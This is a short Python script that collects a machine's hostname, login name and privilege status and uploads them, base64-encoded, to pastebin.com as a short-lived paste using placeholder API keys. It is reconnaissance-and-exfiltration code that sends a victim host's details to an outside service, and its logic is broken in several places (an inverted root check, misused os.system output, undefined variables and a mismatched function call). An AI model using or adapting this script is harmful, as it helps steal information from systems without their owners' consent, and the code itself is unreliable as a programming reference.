import socket
import os
import urllib
import sys
import base64

API_DEV_K = "INSERT YOUR API DEV KEY"
API_USER_K = "INSERT YOUR USER KEY"
theApi = {}

def getHostData():

        hostname = socket.gethostname()
        userLogin = os.getlogin()
        user = os.system("whoami")
        
        if (user != "root"):
            theUser = "Root"
        else:
            theUser = "Not Root"

        return hostname, userLogin, theUser

def forUploadPASTEBIN(thePasteName, theHostname, theUserLogin, the2User):

    theApi['api_dev_key'] = API_DEV_K
    theApi['api_paste_private'] = "0"
    theApi['api_user_key'] = API_USER_K
    theApi['api_paste_code'] = "Hostname: " + theHostName2.decode("UTF-8") + "\nUser Login: " + theUserLogin.decode("UTF-8") + "\nUser Privilege: " + the2User.decode("UTF-8") 
    theApi['api_option'] = "paste"
    theApi['api_paste_format'] = "text"
    theApi['api_paste_expire_date'] = "5M"
    theApi['api_paste_name'] = thePasteName

    try:
        theResponse = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(theApi))
        theURL = theResponse.read()
        return theURL
    except:
        print("Program Interrupted!")
        sys.exit(0)

if __name__ == '__main__':
    theData = getHostData()
    theHostName2, theUserLogin2, the2User2 = base64.b64encode(theData.encode("UTF-8"))

    forUploadPASTEBIN("HOST DATA", theHostName2)
